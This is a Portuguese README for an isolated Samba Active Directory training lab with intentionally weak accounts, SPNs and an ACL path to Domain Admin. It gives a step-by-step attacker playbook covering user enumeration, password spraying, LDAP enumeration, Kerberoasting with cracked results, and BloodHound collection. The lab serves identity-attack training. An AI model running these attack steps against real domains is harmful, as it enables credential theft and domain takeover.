# Lab de Identidade — Active Directory (CORP.LAB) · ISOLADO

Domain Controller **Samba AD-DC** em container, com objetos realistas e fraquezas
intencionais para treino de ataques de identidade. Ataques rodam do container
`attacker`, na mesma rede isolada, com DNS apontando para o DC.

> **Por que Samba e não Windows?** A VPS **não expõe virtualização aninhada**
> (`/dev/kvm` ausente, sem flags `vmx/svm`), então uma VM Windows real só rodaria
> em emulação (inviável). Samba AD-DC entrega um DC funcional (Kerberos/LDAP/DNS/SMB)
> dentro do padrão de containers do lab.

## Topologia

```
rede docker  lab-ad  (172.30.0.0/24) — isolada
 ├─ ad-dc01     172.30.0.10   dc01.corp.lab   Samba AD-DC
 └─ ad-attacker 172.30.0.20   attacker        Impacket, rusthound-ce, kerbrute, kinit/kvno
```

- **Isolamento:** portas publicadas só em `127.0.0.1` do host (acesso por túnel SSH).
  Nada no `ufw`, nada em `0.0.0.0`. Os ataques rodam de dentro da rede `lab-ad`.
- Domínio **CORP.LAB** (NetBIOS `CORP`), DC **dc01.corp.lab**, func level 2008 R2.

## Subir / derrubar

```bash
cd /opt/lab-targets/active-directory
sudo docker compose up -d --build      # 1ª vez provisiona o domínio (~1 min)
sudo docker compose logs -f dc01
sudo docker compose down               # para (mantém dados nos volumes)
sudo docker compose down -v            # zera o domínio
```
Senha do **Administrator** fica em `.env` (`DOMAIN_ADMIN_PASS`, fora do git).

## Credenciais do lab (senhas fracas de propósito)

| Usuário       | Senha         | Papel / fraqueza                                   |
|---------------|---------------|----------------------------------------------------|
| administrator | *(.env)*      | Domain Admin (forte)                               |
| jdoe          | `Summer2025`  | Usuário comum · membro de Helpdesk                 |
| asmith        | `Welcome1`    | Finance · alvo de spraying                         |
| rwilson       | `Password123` | Finance · alvo de spraying                         |
| kjones        | `Autumn2024`  | Flag AS-REP (`DONT_REQ_PREAUTH`) setada *(ver nota)*|
| tadams        | `Winter2023!` | **Domain Admin** — alvo final do caminho de ACL    |
| svc_sql       | `Password1`   | **SPN** `MSSQLSvc/dc01.corp.lab:1433` → Kerberoast |
| svc_backup    | `Backup2020!` | **SPN** `CIFS/backup.corp.lab` + Backup Operators  |

**Caminho BloodHound:** `jdoe → Helpdesk → GenericAll → tadams → Domain Admins`.

## Playbook (do container atacante)

```bash
sudo docker exec -it ad-attacker bash
DC=dc01.corp.lab ; IP=172.30.0.10
```

**1) Enumeração de usuários (sem credencial)**
```bash
kerbrute userenum -d corp.lab --dc $IP /opt/lists/users.txt
```

**2) Password Spraying**
```bash
kerbrute passwordspray -d corp.lab --dc $IP /opt/lists/users.txt Summer2025
```

**3) Enumeração LDAP autenticada** (encontra SPNs, ACLs, flags)
```bash
ldapsearch -x -H ldap://$IP -D jdoe@corp.lab -w Summer2025 -b dc=corp,dc=lab \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

**4) Kerberoasting** — um comando (kinit+kvno nativo + extração + crack):
```bash
kerberoast.sh jdoe Summer2025
#  -> svc_sql    Password1
#  -> svc_backup Backup2020!
```
Hashes ficam em `/tmp/kerberoast.hashes` (formato hashcat `-m 13100`).

**5) BloodHound** (coleta com rusthound-ce → zip p/ a GUI do BloodHound CE)
```bash
rusthound-ce -d corp.lab -u jdoe -p Summer2025 -i $IP -n $IP -z
# importe o .zip no BloodHound CE: mostra jdoe --(Helpdesk, GenericAll)--> tadams --> DA
```

## Acesso por túnel SSH (ferramentas na sua máquina)

```bash
ssh -L 389:127.0.0.1:389 -L 636:127.0.0.1:636 -L 445:127.0.0.1:445 \
    -L 88:127.0.0.1:88    -L 464:127.0.0.1:464 -L 53:127.0.0.1:53 lab
```
> Ataques de Kerberos são estáveis **de dentro** (container `attacker`), onde DNS e
> todas as portas do DC resolvem nativamente.

## Status dos cenários (Samba 4.19)

| Cenário                 | Status | Observação |
|-------------------------|--------|-----------|
| Enum de usuários        | ✅ OK  | kerbrute |
| Password Spraying       | ✅ OK  | kerbrute |
| Enum LDAP               | ✅ OK  | ldapsearch (simple bind) |
| **Kerberoasting**       | ✅ OK  | via Kerberos nativo (`kerberoast.sh`); crack confirmado |
| **BloodHound**          | ✅ OK  | rusthound-ce (coletor Rust) |
| AS-REP Roasting         | ⚠️ limitado | flag setada/visível por LDAP, mas o **KDC do Samba 4.19 não honra `DONT_REQ_PREAUTH`** (exige preauth sempre). Roastável só em AD Windows. |
| DCSync (impacket)       | ⚠️ limitado | `secretsdump -just-dc` falha no DRSUAPI do Samba (bug de interop impacket↔Samba). |

### Notas de interop (importante)
- O **impacket** monta uma **TGS-REQ** que o KDC Heimdal do Samba **não parseia**
  (`KRB_AP_ERR_INAPP_CKSUM`), quebrando GetUserSPNs e o bind Kerberos do bloodhound-python.
  → solução: pedir o TGS com **kinit/kvno nativo** e extrair o hash (`ccache2hashcat.py`).
- **ldap3/bloodhound-python** faz bind NTLM que o Samba lê como usuário vazio
  (anonymous). → solução: usar **rusthound-ce**.
- Para os cenários "limitados", um **atacante Windows + Rubeus** contra este mesmo DC
  cobre AS-REP e Kerberoasting nativo (fora do escopo desta VPS sem virtualização).

## Segurança do lab
- Tudo em `127.0.0.1` / rede docker interna — não exposto à internet.
- Fraquezas (SPN, política fraca, GenericAll, `ldap server require strong auth=no`,
  `ntlm auth=yes`) são **intencionais e documentadas**. Não replicar em produção.
